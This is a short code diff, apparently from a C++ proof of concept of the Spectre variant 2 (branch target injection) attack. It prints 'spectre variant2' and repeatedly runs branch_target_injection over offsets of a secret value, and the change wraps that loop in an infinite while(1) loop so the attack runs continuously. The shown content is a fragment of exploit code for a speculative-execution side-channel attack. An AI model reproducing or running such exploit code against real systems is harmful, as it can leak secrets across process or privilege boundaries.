@@ -121,11 +121,11 @@ int main(int argc, const char **argv) {
        probe[i]=i;
     printf("spectre variant2\n");
     if (JailbreakMemoryPage(reinterpret_cast<void*>(touch_and_break) ) != -1) {
-
+        while(1){
             for (int offset = 0; offset < 75; offset ++ ){
                 branch_target_injection(TheAnswer + offset);
             }
-
+        }
     }
     return 1;
 }
